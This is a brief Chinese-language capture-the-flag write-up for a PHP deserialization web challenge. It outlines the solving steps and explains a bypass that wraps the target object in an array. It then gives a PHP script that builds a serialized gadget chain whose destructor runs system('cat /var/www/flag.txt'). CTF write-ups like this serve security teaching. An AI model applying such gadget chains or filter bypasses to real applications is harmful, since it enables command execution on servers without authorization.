---
description: https://github.com/infoseccomm/InfoSec-CTFs/tree/main/2022/Web/Dev
---

# Dev

PHP反序列化题目

1. 信息收集得到 main.html
2. 访问网页得到提示访问secretdev.php
3. 反序列化漏洞获得flag

反序列化漏洞利用的时候要求第一个不能是O，也就是不可以直接反序列化一个对象，我们可以通过反序列化数组，然后数组中的元素是目标类对象来绕过。



```php
<?php
class test{
  private $close_cmd = 'cat /var/www/flag.txt';
  function __wakeup(){
    throw new \LogicException($this->message.":".$this->cmd);
  }
  function __destruct(){
    system($this->destruct_cmd);
  }
  public function close(){
    system($this->close_cmd);
  }
}
class test1{
public $logger;
 function __construct($a){
    $this->logger = $a;
 }
  function __destruct(){
    $this->logger->close();
  }

}
$a0 = new test();
$a = new test1($a0);
$b = array($a);
var_dump(serialize($b));

?>


```

